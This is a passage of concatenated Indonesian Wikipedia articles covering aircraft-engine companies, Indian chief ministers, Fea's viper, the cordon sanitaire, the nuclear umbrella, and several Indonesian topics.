Dia memberikan salah satu mesin untuk Enrico Forlanini dan dikembangkan lebih lanjut menjadi tiga silinder, berpendingin udara, radial yang ideal mesin untuk pesawat baru. Salah satu mesin awal, 25 hp Anzani W-3 atau jenis Fan, dipasok ke Louis Blériot yang digunakan pada persimpangan yang sukses dari Selat Inggris pada tahun 1909.



</doc>
<doc id="1755805" url="https://id.wikipedia.org/wiki?curid=1755805" title="S.P.A. (mobil)">
S.P.A. (mobil)

S.P.A. (Società Piemontese Automobili), adalah sebuah perusahaan manufaktur mobil Italia, kendaraan militer dan produsen aero-mesin didirikan di Turin oleh Matteo Ceirano dan Michele Ansaldi. Itu aktif antara tahun 1906 dan 1926. Pada tahun 1908, itu bergabung dengan Fabbrica Ligure Automobili Genova (FLAG) dan perusahaan baru, Società Ligure Piemontese Automobili, bermarkas di Genoa sementara manufaktur di Turin.

Pada tahun 1923 pindah ke Turin dan pada tahun 1925 diambil alih oleh Fiat, dimana pembuatan mobil berhenti tapi produksi kendaraan komersial dan militer terus. Meskipun produksi mobil kembali setelah Perang Dunia II, pada 1947 perusahaan itu sepenuhnya ke Fiat.



</doc>
<doc id="1755806" url="https://id.wikipedia.org/wiki?curid=1755806" title="Isotta Fraschini">
Isotta Fraschini

Isotta Fraschini adalah merek historis Italia yang dikenal sebagai produsen mobil yang berada di antara yang paling mewah dan prestisius yang pernah dibangun, truk, serta mesin untuk kelautan dan penerbangan. Didirikan di Milan, Italia, pada tahun 1900 oleh Cesare Isotta dan saudara Vincenzo, Antonio dan Oreste Fraschini, pada tahun 1955 mereka bergabung dengan produsen mesin Breda Motori dan berganti nama FA Isotta Fraschini e Motori Breda. Namun, tidak ada kesuksesan komersial yang signifikan dibuat. Perusahaan bangkrut pada tahun 1999. Pada tahun 2000, sebuah perusahaan baru didirikan, dengan nama Isotta Fraschini Milano. Isotta Fraschini saat ini memiliki kantor di Milan dan Bari.



</doc>
<doc id="1755807" url="https://id.wikipedia.org/wiki?curid=1755807" title="Longsor Kolombia 2015">
Longsor Kolombia 2015

Pada tanggal 18 Mei 2015, Longsor telah menabrak Kota Salgar di Kolombia, 78 orang didung tewas dalam pristiwa ini. Dengan 78 kematian, itu adalah mematikan tunggal kejadian bencana di Kolombia sejak 1999 Armenia Kolombia gempabumi.
Dari 1975 hingga sekarang, Ada Lebih dari 150 bencana di negaranya, Ada 32,000 Kematian hingga sekarang, Dari 2010-2011, Jumlah kematian terjadi sekitar 1600 orang.

Pada hari 18 Mei, 2015 Pukul 3:00 pagi, Longsor telah menabrak Kolombia dan menewas sekitar 78 dan banyak lain masih hilang, Sejak hari ini, belup dapat kapan dia akan pulang.


</doc>
<doc id="1755808" url="https://id.wikipedia.org/wiki?curid=1755808" title="Turbo-Union">
Turbo-Union

Turbo-Union Limited adalah perusahaan patungan antara tiga produsen aero-mesin Eropa, FiatAvio (sekarang Avio), MTU Aero Engines dan Rolls-Royce.

Produk perusahaan adalah hanya RB199, turbofan tiga-spool dikembangkan secara khusus untuk Panavia Tornado.

Kepemilikan perusahaan terbagi

Perusahaan ini sekarang berbasis di Rolls-Royce di Derby, tetapi juga memiliki kantor di kantor pusat Panavia di Jerman.


</doc>
<doc id="1755809" url="https://id.wikipedia.org/wiki?curid=1755809" title="EuroJet Turbo GmbH">
EuroJet Turbo GmbH

Eurojet Turbo GmbH adalah konsorsium multi-nasional, perusahaan mitra Rolls Royce dari Inggris, Avio dari Italia, ITP dari Spanyol dan MTU Aero Engines dari Jerman. Berdiri di Hallbergmoos dekat Munich.

Eurojet GmbH dibentuk pada tahun 1986 untuk mengelola pengembangan, produksi, dukungan, perawatan, dukungan dan penjualan mesin turbofan EJ200 untuk Eurofighter Typhoon.



</doc>
<doc id="1755810" url="https://id.wikipedia.org/wiki?curid=1755810" title="Engine Alliance">
Engine Alliance

"'Engine Alliance (EA)" adalah perusahaan patungan 50/50 antara General Electric dan Pratt & Whitney (anak perusahaan United Technologies) yang dibentuk pada Agustus 1996 untuk mengembangkan, memproduksi, menjual, dan mendukung keluarga teknologi mesin pesawat modern untuk tinggi kapasitas baru, dan pesawat jarak jauh.

Aplikasi utama untuk mesin seperti itu, GP7200, awalnya proyek Boeing 747-500 / 600X, sebelum ini dibatalkan karena kurangnya permintaan dari penerbangan.

Sebaliknya, GP7000 telah kembali dioptimalkan untuk digunakan pada Airbus A380 superjumbo. Di pasar yang bersaing dengan, mesin peluncuran pesawat Rolls-Royce Trent 900. Kedua varian ini adalah GP7270 dan GP7277.



</doc>
<doc id="1755811" url="https://id.wikipedia.org/wiki?curid=1755811" title="Hawker Siddeley Canada">
Hawker Siddeley Canada

Hawker Siddeley Canada adalah unit Kanada dari Hawker Siddeley Group Inggris dan memproduksi gerbong, mobil kereta bawah tanah, trem, mesin pesawat dan kapal dari tahun 1960 ke tahun 1980-an.

Didirikan pada tahun 1962 sebagai British Hawker Siddeley Group divisi Kanada, perusahaan diasumsikan aset AV Roe Kanada Company Ltd.

Hawker Siddeley Kanada berfokus pada manufaktur mobil berat rel (hopper dan tangki mobil) dan kendaraan angkutan (mobil kereta bawah tanah, gerbong antarkota dan trem).



</doc>
<doc id="1755812" url="https://id.wikipedia.org/wiki?curid=1755812" title="Magellan Aerospace">
Magellan Aerospace

Magellan Aerospace Corporation (TSX: MAL) adalah produsen sistem kedirgantaraan dan komponen Kanada. Magellan melakukan perbaikan, pemeriksaan, tes, serta menyediakan layanan penjualan kembali untuk mesin dan komponen-komponennya. Unit bisnis Magellan dibagi ke dalam divisi Mesin Pesawat, Struktur Pesawat, Roket dan Luar Angkasa, serta Produk-Produk Khusus. Kantor pusat Magellan terletak di Mississauga, Ontario. Magellan pun memiliki pabrik yang tersebar di Kanada, Amerika Serikat, dan Inggris.

Magellan adalah pemasok komponen untuk Airbus A380, Boeing 787 Dreamliner, F-35 Joint Strike Fighter, dan juga pesawat pribadi buatan Bombardier. Magellan juga memasok komponen turbin gas untuk pesawat terbang, helikopter, dan kendaraan militer seperti tank M-1 Abrams.

Magellan dibentuk pada tahun 1996 dari sisa divisi milik Fleet Aerospace, yakni Fleet Industries, yang bermarkas di Fort Erie, Ontario. Fleet Industries awalnya memproduksi alat-alat militer untuk Kanada, dan juga memproduksi suku cadang untuk beberapa perusahaan dirgantara.

Selama dekade 1990an, Magellan berkembang dan membeli beberapa perusahaan dirgantara asal Kanada, antara lain Orenda Aerospace (sekarang menjadi 'Magellan Repair, Overhaul and Industrial'), Bristol Aerospace, Chicopee Manufacturing, dan Haley Industries. Beberapa perusahaan asal Amerika Serikat yang juga dibeli oleh Magellan, antara lain Aeronca, AMBEL Precision Manufacturing, Ellanef Manufacturing, Middleton Aerospace, dan Presto Casting Company. Magellan juga tercatat membeli Mayflower Aerospace asal Inggris, dan menamainya 'Magellan Aerospace UK' pada tahun 2003.

Pada tahun 2003, divisi 'Fleet Aerospace' ditutup dan dijual, yang lalu berbisnis kembali dengan nama Fleet Canada Inc. Magellan Aerospace sekarang adalah perusahaan internasional yang terintegrasi, dengan semua anak usahanya beroperasi dengan nama Magellan.



</doc>
<doc id="1755813" url="https://id.wikipedia.org/wiki?curid=1755813" title="Orenda Engines">
Orenda Engines

Orenda Engines adalah produsen mesin pesawat dan bagian pemasok Kanada. Sebagai bagian dari sebelumnya konglomerat Avro Kanada, yang menjadi Hawker Siddeley Kanada, mereka menghasilkan sejumlah mesin jet militer dari tahun 1950-an hingga 1970-an, dan pemasok mesin dan perbaikan perusahaan utama Kanada.



</doc>
<doc id="1755816" url="https://id.wikipedia.org/wiki?curid=1755816" title="Daftar Menteri Urusan Luar Negeri Belanda">
Daftar Menteri Urusan Luar Negeri Belanda

Kementerian Urusan Luar Negeri () adalah kepala Kementerian Urusan Luar Negeri dan anggota Kabinet Belanda. Bert Koenders telah menjadi Menteri Urusan Luar Negeri sejak 17 Oktober 2014.



</doc>
<doc id="1755817" url="https://id.wikipedia.org/wiki?curid=1755817" title="Beludak Fea">
Beludak Fea

Beludak Fea (Anak suku Azemiopinae) adalah beludak primitif yang endemik di dataran Tiongkok Tenggara. Anak suku ini terdiri dari satu genus yakni "Azemiops" dan dua spesies yakni "A. feae" dan "A. kharini". Sejauh ini masih terdiri dari 2 jenis, belum ada jenis baru ataupun anak jenis yang diketahui. Nama umum ular ini dalam bahasa inggris adalah Fea's viper atau Fea's adder."
Ular yang tidak terlalu besar, panjangnya mencapai 1 meter. Tidak seperti beludak pada umumnya, yang berbadan gemuk dan kepala ditutupi sisik kecil yang tidak beraturan (asimetris), ular ini justru berbadan ramping dan kepala ditutupi sisik-sisik besar dan mengkilap seperti sisik kepala ular kolubrid atau elapid. Taring ular ini panjang seperti taring beludak pada umumnya namun tidak dilapisi daging yang tidak tebal, sangat mirip seperti yang dimiliki oleh aspis plastisin ("Atractaspis sp.") yang terdapat di Afrika.

Sisik dorsal berjumlah 17 baris di bagian tengah. Sisi ventral 180 dan subklaudal 40. Sisik internasal bersinggungan dengan prefrontal. Sisik frontal dan supraokular besar dan agak panjang, juga sisik pariental. Sisik wajah (loreal) berbentuk segilima beraturan. Terdapat 3 sisik preokular dan 2 sisik postokular, serta 7 sisik labial. Warna tubuh ungu kelabu cerah dengan belang-belang berwarna oranye cerah. Belang oranye lebih sempit dari belang ungu. Kepala berwarna oranye.

Biasanya hidup di dataran rendah dan dataran tinggi. Namun ada juga ular tangguh yang hidup di pegunungan hingga ketinggian 1000 meter dengan suhu 20-25 °C. Mereka bisa ditemukan di berbagai wilayah ekologi, mulai hutan hingga sekitar pemukiman. Aktif pada malam hari. Ular ini akan segera pergi atau mencari tempat bersembunyi jika merasa terganggu. Jika terpojok, ular ini akan memipihkan badannya, dan terkadang menggoyangkan ekornya, lalu menyerang. Terkadang ular ini menggunakan gigitan hampa alias tidak menyuntikkan bisa sama sekali jika menyerang pengganggunya. Mangsa ular ini adalah mamalia kecil.

Tersebar di dataran Vietnam utara, Tiongkok tenggara, Tiongkok selatan (Fujian, Guangxi, Jiangxi, Guizhou, Sichuan, Yunnan, Zhejiang), Myanmar utara, dan Tibet tenggara. Lokasi sampel yang dideskripsikan adalah ""Kachien Hills"", Myanmar.



</doc>
<doc id="1755820" url="https://id.wikipedia.org/wiki?curid=1755820" title="Daftar Ketua Menteri Telangana">
Daftar Ketua Menteri Telangana

Ketua Menteri Telangana adalah ketua eksekutif negara bagian selatan India Telangana.
Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, tetapi otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Telangana, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut.

Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Ketua menteri Telangana yang pertama, K. Chandrashekar Rao dari Telangana Rashtra Samithi, juga merupakan petahana saat ini. Ia telah memegang jabatan tersebut sejak Telangana memisahkan diri dari Andhra Pradesh pada 2 Juni 2014.



</doc>
<doc id="1755833" url="https://id.wikipedia.org/wiki?curid=1755833" title="Cordon sanitaire">
Cordon sanitaire

Cordon sanitaire () adalah frasa bahasa Prancis yang berarti "pembatas kebersihan" bila diterjemahkan secara harafiah. Istilah ini awalnya bermakna pembatas yang dipakai untuk mencegah penyebaran wabah seperti Maut Hitam. Istilah ini juga digunakan dalam bahasa Inggris untuk menyebut upaya pencegahan penyebaran ideologi yang tidak diinginkan atau berbahaya, misalnya kebijakan pembendungan Uni Soviet yang dicetuskan George F. Kennan.

Istilah "cordon sanitaire" dalam hal pembendungan ideologi mengacu pada "sistem aliansi bentukan Prancis di Eropa pasca-Perang Dunia I yang membentang dari Finlandia sampai Balkan" yang "mengurung Jerman dan memisahkan Rusia dari Eropa Barat sehingga mengisolasi dua negara Eropa yang 'berpenyakit' tersebut."

Perdana Menteri Prancis, Georges Clemenceau, merupakan orang pertama yang menggunakan istilah ini dalam diplomasi. Pada bulan Maret 1919, ia meminta negara-negara perbatasan yang baru merdeka ("negara limitrof") dari Kekaisaran Rusia dan Rusia Soviet untuk membentuk persatuan defensif dan mencegah penyebaran komunisme ke Eropa Barat; ia menyebut aliansi tersebut "cordon sanitaire." Contoh penggunaan frasa ini masih menjadi contoh yang terkenal. Namun demikian, istilah "cordon sanitaire" juga digunakan untuk menyebut beberapa negara pembatas yang mengitari sebuah negara yang berbahaya dan lebih besar.



</doc>
<doc id="1755835" url="https://id.wikipedia.org/wiki?curid=1755835" title="Naveen Patnaik">
Naveen Patnaik

Naveen Patnaik (kelahiran 16 Oktober 1946) adalah Ketua Menteri Odisha ke-14 dan saat ini. Selain menjadi petinggi Biju Janata Dal, ia juga merupakan seorang penulis dan telah menerbitkan empat buku.

Patnaik lahir pada 16 Oktober 1946 di Cuttack dalam sebuah keluarga Karan dari pasangan Biju Patnaik, mantan Ketua Menteri Odisha, dan istrinya Gyan Patnaik. Patnaik dididik di Sekolah Doon yang prestisius di Dehradun. Setelah itu, ia masuk Kolese Kirori Mal, Universitas Delhi, dan ia dikualifikasikan untuk gelar Bachelor of Arts.

Naveen Patnaik menjalani kebanyakan hari-hari awalnya di luar Odisha sehingga ia tak memahami bahasa Oriya. Ia adalah satu-satunya ketua menteri India yang tidak bisa berbicara bahasa wilayah dari negara bagiannya. Namun, ia dapat berbicara dalam bahasa Hindi dan bahasa Inggris. Ia memberikan pidato-pidato Oriya yang ditulis dalam bahasa Inggris.




</doc>
<doc id="1755842" url="https://id.wikipedia.org/wiki?curid=1755842" title="Kalvakuntla Chandrashekar Rao">
Kalvakuntla Chandrashekar Rao

Kalvakuntla Chandrashekar Rao (; lahir pada 17 Februari 1954), yang lebih dikenal dan disingkat sebagai "KCR", adalah Ketua Menteri negara bagian India Telangana pertama dan saat ini. Ia adalah presiden Telangana Rashtra Samithi, sebuah Partai Regional di India. Ia adalah seorang Anggota Majelis Legislatif (Telangana) dari konstituensi Gajwel di Distrik Medak di Telangana. Sebelumnya, ia menjabat sebagai Anggota Majelis Legislatif (Andhra Pradesh) dari Siddipet dan juga sebagai Anggota Parlemen dari Mahbubnagar dan Karimnagar. Ia mulai menjabat sebagai Ketua Menteri negara bagian Telangana yang baru dibentuk pertama pada 2 Juni 2014.

Rao lahir pada 17 Februari 1954 di desa Chintamadaka, Siddipet Mandal, distrik Medak, negara bagian Hyderabad (sekarang di Telangana) Ia meraih gelar Master dalam bidang Sastra Telugu dari Kolese Kesenian Osmania-Universitas Osmania, Hyderabad.

Kalvakuntla Chandrashekhar Rao menikah dengan Shobha dan memiliki dua anak. Putranya, K. T. Rama Rao, adalah seorang legislator dari Sircilla, distrik Karimnagar, Telangana dan menteri kabinet untuk Departemen IT & Panchayat Raj. Putrinya, Kalvakuntla Kavitha, adalah anggota parlemen dari Nizamabad, Telangana. Keponakannya, Harish Rao, adalah MLA untuk konstituensi Siddipet dan sekarang menjadi menteri kabinet untuk Irigasi, Urusan Legislatif dan Pemasaran di pemerintahan Telangana. KCR memiliki 9 saudari dan 1 kakak laki-laki. KCR memiliki kemampuan yang baik dalam memakai bahasa Telugu, Inggris, Urdu dan Hindi.


</doc>
<doc id="1755844" url="https://id.wikipedia.org/wiki?curid=1755844" title="Payung nuklir">
Payung nuklir

Payung nuklir adalah janji sebuah negara senjata nuklir untuk melindungi negara sekutu yang tidak memiliki senjata nuklir. Payung nuklir biasanya digunakan untuk menyebut aliansi keamanan Amerika Serikat dan Jepang, Korea Selatan, Pakta Pertahanan Atlantik Utara (sebagian besar Eropa, Turki, Kanada), dan Australia. Konsep payung nuklir tercipta pada masa Perang Dingin untuk mencegah agresi Uni Soviet. Bagi sejumlah negara, payung nuklir merupakan jalan alternatif memiliki senjata nuklir. Konsep alternatif lainnya adalah zona bebas senjata nuklir atau berbagi nuklir.

NATO dibentuk pada awal Perang Dingin dan mengakui kekuatan nuklir Amerika Serikat sebagai bagian utama yang mempertahankan Eropa Barat dari potensi serangan Soviet. Sebagian besar negara Eropa non-Komunis bergabung dengan NATO, sedangkan sisanya (Irlandia, Swiss, Austria, Swedia, Finlandia) mempertahankan posisi netral. Swedia dan Swiss sempat berencana mengembangkan senjata nuklirnya sendiri, namun tidak jadi.

NATO melibatkan lima negara senjata nuklir resmi. Britania Raya dan Kanada ambil peran dalam pengembangan bom atom Amerika Serikat (Proyek Manhattan) pada Perang Dunia II, kemudian dikeluarkan dari program berbagi rahasia senjata nuklir oleh Kongres Amerika Serikat. Britania pun meluncurkan program senjata nuklirnya sendiri. Setelah Britania berhasil mengembangkan senjata termonuklir, A.S. dan Britania menandatangani Perjanjian Pertahanan Bersama Amerika Serikat–Britania Raya 1958. A.S. berjanji akan berbagi desain senjatanya sehingga Britania tidak perlu mengembangkan senjata sendiri.

Prancis mengembangkan force de frappe nuklir dan keluar dari struktur komando NATO tetapi masih bersekutu dengan negara-negara Barat lainnya. Konsep "berbagi nuklir" diciptakan untuk mencegah proliferasi nuklir independen oleh negara-negara Barat. Prancis bergabung lagi dengan komando militer gabungan NATO pada tanggal 4 April 2009.

Setelah Perang Dingin berakhir, banyak negara-negara Eropa Tengah dan Timur yang bergabung dengan NATO walaupun tujuan utama NATO (mencegah pengaruh Uni Soviet) sudah tidak berlaku lagi. Sejumlah pihak menolak perluasan NATO karena sifatnya provokatif terhadap Rusia.

Pertahanan rudal akan menjadi "payung" alternatif melawan serangan nuklir. Ini bukan versi konvensional dari "payung nuklir". Pertahanan rudal merupakan istilah retoris yang lebih mengutamakan pertahanan aktif daripada deterensi nuklir karena "payung nuklir" konvensional cenderung bergantung pada deterensi.



</doc>
<doc id="1755848" url="https://id.wikipedia.org/wiki?curid=1755848" title="Debby Shinta">
Debby Shinta

Debby Shinta () adalah aktris berkebangsaan Indonesia. Namanya semakin melambung ketika membintangi sinetron "Madun" di SCTV. Debby juga merupakan adik dari personel JKT48 generasi kedua, Della Delila.



</doc>
<doc id="1755850" url="https://id.wikipedia.org/wiki?curid=1755850" title="Birdramon">
Birdramon

Birdramon merupakan salah satu digimon yang menjadi peran utama dalam Digimon Adventure dan Digimon Adventure 02. Birdramon diambil dari kata "bird" yang berarti burung, dan desain dari digimon ini berbentuk burung phoenix. Dalam tingkatan level evolusi, Birdramon berlevel Champion. Ia berevolusi dari Biyomon, dan evolusi berikutnya (level Ultimate) adalah Garudamon. Partnernya dalam seri anime Digimon Adventure dan Digimon Adventure 02 adalah Sora Takenouchi.

Biyomon berevolusi menjadi Birdramon pada episode 4 dalam pertarungan melawan Meramon. Dalam episode itu, Biyomon menyaksikan Sora dan digimon lainnya dalam bahaya dan ia memiliki keinginan kuat untuk melindungi mereka. Di saat itulah Biyomon berevolusi menjadi Birdramon dan mampu mengalahkan Meramon.

Kekuatan utama dari Birdramon adalah semburan api dan runtuhan meteor dari sayapnya, serta serangan cakarnya.



</doc>
<doc id="1755855" url="https://id.wikipedia.org/wiki?curid=1755855" title="Mukul Sangma">
Mukul Sangma

Dr. Mukul M. Sangma (kelahiran 20 April 1965) adalah seorang politikus India dan pemimpin partai Kongres Nasional India di negara bagian Meghalaya. Ia adalah Ketua Menteri Meghalaya saat ini.

Dr. Mukul M. Sangma lahir pada 20 April 1965 di desa Chengkompara village di South West Garo Hills district pada masa sekarang dari pasangan Binoy Bhushan M Marak dan Roshana Begum. Ia menyelesaikan pendidikan sekolahnya dari Sekolah Tinggi Pemerintah di Ampati pada 1982 dan mengikuti ujian kelulusan pre-universitasnya dalam bidang Ilmu Pengetahuan dari Kolese St. Antonius di Shillong pada 1984. Ia lulus dalam bidang pengobatan dari Institut Ilmu Pengetahuan Pengobatan Regional (IIPPR) di Imphal pada 1989. Ketika menuntut ilmu, ia menduduki sejumlah jabatan dalam badan pemerintahan Dewan Pelajar IIPPR. Pada 1991, ia bergabung sebagai pejabat pengobatan dan kesehatan di Pusat Kesehatan Publik Zikzak.

Sangma aktif bergabung dalam dunia politik pada 1993, ketika ia terpilih pada Mahkamah Legislatif Meghalaya dari konstituensi Ampatigiri sebagai kandidat independen. Ia dilantik menjadi ketua Kerjasama Transportasi Meghalaya. Ia terpilih kembali menjadi Mahkamah Legislatif Meghalaya dari konstituensi Ampatigiri pada 1998, 2003 dan 2008 sebagai kandidat Kongres Nasional India.

Pada 2003, ia menjadi menteri dalam negeri dan pendidikan dari pemerintahan Meghalaya yang dipimpin oleh Ketua Menteri D. D. Lapang. Pada 11 April 2005, ia dilantik menjadi deputi ketua menteri Meghalaya. Namun ia terpaksa mengundurkan diri pada 7 Oktober 2005 setelah lima orang di Williamnagar di distrik Bukit Garo Timur dan empat orang di Tura di distrik Bukit Garo Barat tewas dan lebih dari 100 orang terluka dalam penembakan polisi dan Pasukan Polisi Reserve Pusat pada 30 September 2005.

Pada pemilihan Lok Sabha 2004, ia menjadi kandidat KNI dari konstituensi Tura di Meghalaya.

Pada 13 Mei 2009, ia kembali menjadi deputi ketua menteri pemerintahan Aliansi Serikat Maghalaya (ASM) yang dipimpin Kongres Nasional India di Meghalaya yang dipimpin oleh Ketua Menteri D. D. Lapang. Setelah D. D. Lapang mengundurkan diri pada 19 April 2010, ia menjadi Ketua Menteri Meghalaya pada 20 April 2010.


</doc>
<doc id="1755858" url="https://id.wikipedia.org/wiki?curid=1755858" title="Pascanasionalisme">
Pascanasionalisme

Pascanasionalisme atau non-nasionalisme menjelaskan proses hilangnya keutamaan negara-bangsa dan identitas nasional di mata institusi supranasional dan global. Meski pascanasionalisme bukan antonim dari nasionalisme, dua istilah tersebut beserta segala asumsinya merupakan suatu antitesis. Ada beberapa faktor yang mendorong pascanasionalisme, yaitu ekonomi, politik, dan budaya.

Peningkatan globalisasi di sektor ekonomi, misalnya perluasan perdagangan internasional barang mentah, barang jadi, dan jasa, serta pentingnya perusahaan multinasional dan internasionalisasi pasar keuangan, telah mengalihkan perhatian dunia dari ekonomi nasional ke ekonomi global. Pada saat yang sama, kekuasaan politik beralih dari pemerintah nasional ke institusi supranasional seperti Perserikatan Bangsa-Bangsa, Uni Eropa, North American Free Trade Agreement (NAFTA), dan NATO. Selain itu, industri media dan hiburan semakin mengglobal dan mendorong pembentukan tren dan opini di tingkat supranasional. Migrasi orang atau kelompok antarnegara ikut mendorong pembentukan identitas dan kepercayaan pascanasional, tetapi kedekatan dengan kewarganegaraan dan identitas nasional juga masih dirasa penting.



</doc>
<doc id="1755863" url="https://id.wikipedia.org/wiki?curid=1755863" title="Anugerah Komisi Penyiaran Indonesia 2013">
Anugerah Komisi Penyiaran Indonesia 2013

Anugerah Komisi Penyiaran Indonesia 2013 adalah penghargaan penyiaran Indonesia oleh Komisi Penyiaran Indonesia yang dilaksanakan pada 12 Desember 2013 di Gedung Manggala Wanabakti, Jakarta, dan disiarkan stasiun televisi Kompas TV. Anugerah ini dilakukan rutin sebagai bentuk apresiasi KPI atas kerja keras lembaga penyiaran yang berupaya menyuguhkan tontonan yang menarik namun tetap sehat dan berkualitas.



</doc>
<doc id="1755877" url="https://id.wikipedia.org/wiki?curid=1755877" title="Sekolah Penerbang TNI AU">
Sekolah Penerbang TNI AU

Sekolah Penerbang TNI AU atau (Sekbang) adalah pusat pendidikan calon penerbang muda yang dimiliki oleh TNI Angkatan Udara. Sekbang ini merupakan tempat pendidikan dasar kecabangan yang bertujuan untuk mencetak Perwira Penerbang TNI Angkatan Udara lulusan Akademi Angkatan Udara guna mengawaki alat utama sistem senjata TNI AU khususnya sebagai Korps Penerbang. Sekolah Penerbang bernaung di bawah Wing Pendidikan Terbang, Lanud Adisutjipto, Yogyakarta.

Pendidikan Sekbang ini berlangsung selama 17 bulan. Sebelum melaksanakan pendidikan terbang yang sesungguhnya, mereka dibekali banyak teori dengan melaksanakan pendidikan di kelas atau bina kelas murni atau yang dikenal dengan "ground school" selama 2,5 bulan di Skadron Pendidikan 104. Di Skadik 104 ini selain dibekali teori mereka juga dilatih Survival di lapangan dan medan yang sebenarnya di gunung dan waduk-waduk. Selanjutnya mereka mendapatkan pendidikan terbang pertama atau terbang latih dasar di Skadron Pendidikan 101 dengan pesawat AS-202 Bravo dan Grob selama 3,5 bulan. Setelah memiliki kemampuan terbang dasar, selanjutnya melaksanakan pendidikan terbang latih lanjut dengan pesawat T-34 Charle di Skadron Pendidikan 102 selama kurang lebih 8 Bulan. Selain itu, calon penerbang militer ini juga dibekali dengan Kursus CPL selama 2 minggu dan Communication Skill dan kepribadian selama 2 minggu. Untuk Bina Terbang Latih Lanjut Jurusan Rotary Wing menggunakan Helikopter B-47G Solloy di Pangkalan Udara Suryadarma, Subang.

Setelah tahapan demi tahapan dapat dilalui mereka berhak atas "Brevet Penerbang" dengan ditandai upacara yang dikenal dengan "Wingday Penerbang".

Ada dua jalur perwira Sekbang TNI AU; Sekbang TNI AU diambil dari jalur lulusan Akademi Angkatan Udara (AAU) dan Sekbang PSDP TNI diambil dari lulusan SMA, tepatnya melalui jalur Sekolah Penerbang Prajurit Sukarela Dinas Pendek TNI. Untuk pendidikan juga tidak sama, terutama untuk pendidikan keperwiraan. Untuk Sekbang TNI AU sudah mendapatkan pendidikan dasar militer saat Pendidikan di Akademi Angkatan Udara Sedangkan PSDP TNI harus menjalani pendidikan dasar kemiliteran di Skadron Pendidikan 401, Lanud Adi Sumarmo, Surakarta sebelum menjalani pendidikan sebagai Penerbang.

Sekbang terpadu merupakan sekolah penerbang pertama yang diikuti oleh ketiga Matra TNI yang berasal dari perwira remaja Akademi Angkatan Udara, Akademi Militer dan Akademi Angkatan Laut tahun 2014 atau Sekbang TNI Terpadu Angkatan 89. Setelah melaksanakan pendidikan 31 bulan terhitung 10 November 2014 sampai 30 Mei 2016, terpilih menjadi penerbang terbaik yaitu Letda Tek Fajar Sidiq dari 16 penerbang Jurusan Tempur, Letda Tek Triandaru dari 18 penerbang Jurusan Angkut serta Letda CPN Ratna Fathi dari 14 penerbang Jurusan Helikopter di antara 48 Siswa Sekbang TNI Terpadu Angkatan 89 Ta. 2014.


</doc>
<doc id="1755878" url="https://id.wikipedia.org/wiki?curid=1755878" title="Daftar perang yang memanjang akibat masalah diplomatik">
Daftar perang yang memanjang akibat masalah diplomatik

Ada banyak klaim mengenai perang yang memanjang akibat masalah diplomatik. Kadang-kadang klaim tersebut dibuat oleh sebuah negara kecil yang terlibat dalam pernyataan perang tetapi tak sengaja dikeluarkan dari perjanjian damai dalam konflik yang lebih besar. "Perang yang memanjang" ini baru disadari setelah ditemukan dan tidak ada dampaknya meski pertempuran sudah berakhir sekian tahun (biasanya ratusan tahun) yang lalu.

Penemuan "perang yang memanjang" biasanya menjadi kesempatan bagi upacara perdamaian simbolis antara pihak terlibat. Acara seperti ini dapat mendorong pariwisata dan hubungan antarnegara dengan merintis interaksi dan membina hubungan yang belum pernah tercipta karena alasan sejarah atau geografis. Upacara perdamaian simbolis ini berniat baik dan melibatkan pejabat pemerintahan tertinggi.

Keadaan perang seperti ini berbeda dengan keadaan ketika semua pihak terlibat sengaja menghindari perjanjian perdamaian karena sengketa politiknya bertahan setelah konflik militer, misalnya sengketa Kepulauan Kuril antara Jepang dan Rusia.



</doc>
<doc id="1755919" url="https://id.wikipedia.org/wiki?curid=1755919" title="Daftar orang yang berlindung di kedutaan besar">
Daftar orang yang berlindung di kedutaan besar

Karena misi diplomatik seperti kedutaan besar dan konsulat tidak boleh dimasuki negara naungan ("host country") tanpa izin (meski tidak memiliki status ekstrateritorial), sejumlah orang pernah berlindung dari kejaran pihak berwenang negara naungan di kedutaan besar negara lain.


</doc>
<doc id="1756065" url="https://id.wikipedia.org/wiki?curid=1756065" title="Daftar perang tahun 2003–10">
Daftar perang tahun 2003–10

Catatan:

Berikut adalah daftar perang yang pecah pada tahun 2003 hingga 2010. Perang-perang lainnya dapat ditemukan di artikel daftar perang dan daftar perang yang memanjang akibat masalah diplomatik.



</doc>
<doc id="1756074" url="https://id.wikipedia.org/wiki?curid=1756074" title="Daftar perang tahun 2011–sekarang">
Daftar perang tahun 2011–sekarang

Catatan:

Berikut adalah daftar perang yang pecah pada tahun 2011 hingga sekarang. Perang-perang lainnya dapat ditemukan di artikel daftar perang dan daftar perang yang memanjang akibat masalah diplomatik.



</doc>
<doc id="1756076" url="https://id.wikipedia.org/wiki?curid=1756076" title="Model keyakinan buruk tersirat">
Model keyakinan buruk tersirat

Model keyakinan buruk tersirat dalam pemrosesan informasi adalah teori psikologi politik yang pertama kali dikemukakan Ole Holsti untuk menjelaskan hubungan antara keyakinan John Foster Dulles dan model pemrosesan informasinya.

Model ini merupakan model saingan yang paling banyak dipelajari. Sebuah negara dianggap sebagai musuh, dan segala indikator yang menyatakan sebaliknya justru tidak diakui. Indikator-indikator ini dianggap sebagai propaganda atau tanda kelemahan. Contohnya adalah sikap John Foster Dulles terhadap Uni Soviet, atau sikap awal Israel terhadap Organisasi Pembebasan Palestina.


</doc>
<doc id="1756078" url="https://id.wikipedia.org/wiki?curid=1756078" title="SDIT Ar Raihan">
SDIT Ar Raihan

SDIT Ar Raihan atau Sekolah Dasar Islam Terpadu Ar Raihan adalah sekolah dasar swasta di Kabupaten Bantul yang dikelola oleh Yayasan Ar Raihan.

Secara resmi SDIT Ar Raihan mulai beroperasi pada tahun 1999 yang ditandai oleh keluarnya Surat Keputusan Dinas Pendidikan dan Kebudayaan Kabupaten Bantul—sekarang bernama Dinas Pendidikan Dasar—No. 03/1999 tanggal 13 September 1999. Surat Keputusan ini kemudian diikuti oleh Surat Keputusan pendirian yang dikeluarkan oleh Dinas Pendidikan dan Kebudayaan Kabupaten Bantul Nomor 001 Tahun 2003 tanggal 11 Januari 2003.

